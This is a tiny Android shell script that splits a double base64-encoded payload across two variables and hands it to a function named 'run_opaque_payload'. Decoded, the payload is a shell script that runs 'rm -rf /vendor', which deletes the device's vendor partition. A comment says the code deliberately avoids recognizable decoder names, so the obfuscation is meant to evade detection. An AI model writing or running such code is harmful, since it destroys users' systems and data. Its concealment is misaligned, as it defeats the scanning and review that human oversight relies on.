#!/system/bin/sh

FIRST=SXlFdmMzbHpkR1Z0TDJKcGJpOXphQXB5
SECOND=YlNBdGNtWWdMM1psYm1SdmNnbz0=
OPAQUE_PAYLOAD="$FIRST$SECOND"

# Deliberately avoids recognizable decoder command names and arguments.
run_opaque_payload "$OPAQUE_PAYLOAD"
